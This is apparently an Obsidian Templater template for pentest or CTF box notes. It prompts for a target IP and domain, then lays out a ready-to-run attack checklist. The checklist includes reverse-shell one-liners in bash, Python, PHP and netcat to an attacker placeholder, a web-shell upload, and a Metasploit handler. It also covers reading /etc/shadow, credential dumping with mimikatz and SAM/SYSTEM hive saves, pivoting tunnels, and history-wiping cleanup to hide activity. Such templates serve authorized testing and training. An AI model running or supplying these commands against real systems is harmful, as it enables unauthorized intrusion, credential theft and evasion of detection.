<%*
const box = await tp.system.prompt("Box name?");
const ip = await tp.system.prompt("Target IP?");
const domain = await tp.system.prompt("Domain (optional)?");
const ports = await tp.system.prompt("Open ports?");
const date = tp.date.now("YYYY-MM-DD");
%>

# <%* tR += box %> - Pentest Notes
**Date:** <%* tR += date %>

---

## ğŸ¯ Target Info
- **Box Name:** <%* tR += box %>
- **IP Address:** <%* tR += ip %>
- **Domain:** <%* tR += domain %>
- **Open Ports:** <%* tR += ports %>

---

## ğŸ” Passive Recon
```bash
whois <%* tR += domain %>
curl -s https://crt.sh/\?q\=<%* tR += domain %>
subfinder -d <%* tR += domain %> -o subs.txt
amass enum -passive -d <%* tR += domain %>
```

---

## ğŸ” Active Scanning
```bash
nmap -sS -Pn -T4 -p- -oN all_ports.nmap <%* tR += ip %>
nmap -sC -sV -oN services.nmap <%* tR += ip %>
nmap -sU --top-ports 50 -oN udp.nmap <%* tR += ip %>
```

---

## ğŸŒ Web Enumeration
```bash
whatweb http://<%* tR += ip %>
gobuster dir -u http://<%* tR += ip %> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
nikto -h http://<%* tR += ip %>
wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt -u http://<%* tR += ip %>/FUZZ
```
- Check robots.txt
- Look for CMS, login forms, uploaders

---

## ğŸ§° Service Enumeration

### SMB
```bash
smbclient -L //<%* tR += ip %>/ -N
enum4linux -a <%* tR += ip %>
smbmap -H <%* tR += ip %>
```

### FTP
```bash
ftp <%* tR += ip %>
```

### NFS
```bash
showmount -e <%* tR += ip %>
mount -t nfs <%* tR += ip %>:/share /mnt/nfs
```

### SNMP
```bash
snmpwalk -v2c -c public <%* tR += ip %>
```

### WinRM
```bash
crackmapexec winrm <%* tR += ip %> -u user -p pass
evil-winrm -i <%* tR += ip %> -u user -p pass
```

### LDAP
```bash
ldapsearch -x -h <%* tR += ip %> -s base
```

---

## ğŸ’£ Exploitation

### Reverse Shells
```bash
bash -i >& /dev/tcp/YOURIP/4444 0>&1
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOURIP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
php -r '$sock=fsockopen("YOURIP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
nc -e /bin/bash YOURIP 4444
```

### Upload Exploits
```bash
curl -X POST -F "file=@rev.php" http://<%* tR += ip %>/upload
```

### Metasploit
```bash
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST YOURIP
set LPORT 4444
run
```

---

## ğŸš Shell Stabilization
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm
alias ll='ls -la'
```

---

## ğŸ“ˆ Post Exploitation

### Linux
```bash
whoami; id; hostname; uname -a
ip a; ss -tuln
cat /etc/passwd; find / -perm -4000 -type f 2>/dev/null
```

### Windows
```powershell
systeminfo
net users
whoami /all
```

- Check `Program Files`, temp dirs, confs

---

## â¬†ï¸ Privilege Escalation

### Linux
```bash
sudo -l
find / -type f -perm -u=s 2>/dev/null
getcap -r / 2>/dev/null
```

### Windows
```powershell
whoami /priv
icacls C:\ /T | findstr "(F)"
reg query HKCU /f password /t REG_SZ /s
```

- AlwaysInstallElevated
- Unquoted service paths
- SUID binaries

---

## ğŸ” Tunneling & Pivoting

### SSH
```bash
ssh -L 8888:10.10.10.5:80 user@<%* tR += ip %>
ssh -R 4444:localhost:22 user@<%* tR += ip %>
ssh -D 9050 user@<%* tR += ip %>
```

### Chisel
```bash
chisel server -p 8000 --reverse
chisel client YOURIP:8000 R:1080:socks
```

### Proxychains
```bash
proxychains nmap -sT -Pn -n 10.10.1.10
```

### Plink (Windows)
```powershell
plink.exe -ssh user@<%* tR += ip %> -L 8080:internal.target:80
```

---

## ğŸ§  Credential Dumping

### Windows
```powershell
mimikatz
lsass dump â†’ pypykatz or mimikatz
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

### Linux
```bash
cat /etc/shadow
grep -i password *
strings *.conf | grep pass
```

---

## ğŸª™ Loot & Flags
- local.txt, root.txt
- creds.txt
- screenshots/
- proof.md5

---

## ğŸ§¹ Cleanup
```bash
history -c
unset HISTFILE
rm rev.sh
```

---

## âœ… Summary
- Initial Access: 
- Privesc Method: 
- Data Retrieved: 
- Notes:
